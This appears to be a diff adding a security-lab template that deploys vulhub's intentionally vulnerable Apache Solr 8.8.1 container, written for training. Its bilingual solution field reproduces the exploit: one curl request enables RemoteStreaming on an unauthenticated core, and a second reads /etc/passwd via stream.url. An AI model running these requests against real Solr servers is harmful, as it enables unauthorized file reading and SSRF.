@@ -1,0 +1,102 @@
+apiVersion: hivora/v1
+kind: Template
+metadata:
+  slug: vulhub-solr-remote-streaming-fileread
+  name: Apache Solr RemoteStreaming Arbitrary File Reading and SSRF
+  version: 1.0.0
+  category: security-lab
+  tags:
+  - vulhub
+  - apache-solr
+  description: Apache Solr — Apache Solr RemoteStreaming Arbitrary File Reading and SSRF (vulhub).
+  links:
+    site: https://github.com/vulhub/vulhub/tree/master/solr/Remote-Streaming-Fileread
+  maintainer: vulhub
+  license: MIT (vulhub)
+  source: https://github.com/vulhub/vulhub/tree/master/solr/Remote-Streaming-Fileread
+  lab:
+    phase: exploitation
+    cves: []
+    os:
+    - linux
+    tech:
+    - apache-solr
+    - path-traversal
+    - ssrf
+    difficulty: medium
+    summary: Apache Solr RemoteStreaming Arbitrary File Reading and SSRF
+    solution:
+      fr: |
+        Adresse : IP:port affichés par le panel (les ports du guide sont ceux d'origine de vulhub), ou l'IP du lab sur le port d'origine via le VPN labo. Guide d'origine (anglais) : https://github.com/vulhub/vulhub/tree/master/solr/Remote-Streaming-Fileread
+        Apache Solr is an open-source search server. When Apache Solr does not have authentication enabled, an attacker can craft a request to enable specific configurations, potentially leading to Server-Side Request Forgery (SSRF) or arbitrary file reading vulnerabilities.
+        References:
+        - <https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ>
+        # Environment Setup
+        Execute the following command to start an Apache Solr 8.8.1 server:
+        $ docker compose up -d
+        After the server starts, you can access the Apache Solr management interface at `http://your-ip:8983/`.
+        # Vulnerability Reproduction
+        First, visit `http://your-ip:8983/solr/admin/cores?indexInfo=false&wt=json` to extract the database name:
+        Send the following request to modify the configuration of the `demo` core and enable `RemoteStreaming`:
+        $ curl -i -s -k -X $'POST' \
+        $      -H $'Content-Type: application/json' --data-binary $'{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' \
+        $      $'http://your-ip:8983/solr/demo/config'
+        Then, you can read arbitrary files through the `stream.url` parameter:
+        $ curl -i -s -k 'http://your-ip:8983/solr/demo/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'
+      en: |
+        Address: the IP:port shown by the panel (the guide's ports are vulhub's original ones), or the lab's IP on the original port through the labs VPN. Original guide: https://github.com/vulhub/vulhub/tree/master/solr/Remote-Streaming-Fileread
+        Apache Solr is an open-source search server. When Apache Solr does not have authentication enabled, an attacker can craft a request to enable specific configurations, potentially leading to Server-Side Request Forgery (SSRF) or arbitrary file reading vulnerabilities.
+        References:
+        - <https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ>
+        # Environment Setup
+        Execute the following command to start an Apache Solr 8.8.1 server:
+        $ docker compose up -d
+        After the server starts, you can access the Apache Solr management interface at `http://your-ip:8983/`.
+        # Vulnerability Reproduction
+        First, visit `http://your-ip:8983/solr/admin/cores?indexInfo=false&wt=json` to extract the database name:
+        Send the following request to modify the configuration of the `demo` core and enable `RemoteStreaming`:
+        $ curl -i -s -k -X $'POST' \
+        $      -H $'Content-Type: application/json' --data-binary $'{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' \
+        $      $'http://your-ip:8983/solr/demo/config'
+        Then, you can read arbitrary files through the `stream.url` parameter:
+        $ curl -i -s -k 'http://your-ip:8983/solr/demo/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'
+requirements:
+  arch:
+  - amd64
+form:
+  basic:
+  - id: port_8983
+    group:
+      fr: Accès
+      en: Access
+    label: solr 8983/tcp
+    type: port
+    default: 8983
+  - id: port_5005
+    group:
+      fr: Accès
+      en: Access
+    label: solr 5005/tcp
+    type: port
+    default: 5005
+services:
+  solr:
+    role: main
+    image: vulhub/solr
+    tag: 8.8.1@sha256:2530555b31527e15a9a7fe319bb21b88444d3383138048d4664775751aec7bfc
+    frozen: true
+    ports:
+    - container: 8983
+      host: '{{ form.port_8983 }}'
+      protocol: tcp
+      purpose: web
+      exposure: lan
+    - container: 5005
+      host: '{{ form.port_5005 }}'
+      protocol: tcp
+      purpose: other
+      exposure: lan
+update:
+  strategy: manual
+access:
+  web: http://{{ host.lan_ip }}:{{ form.port_8983 }}
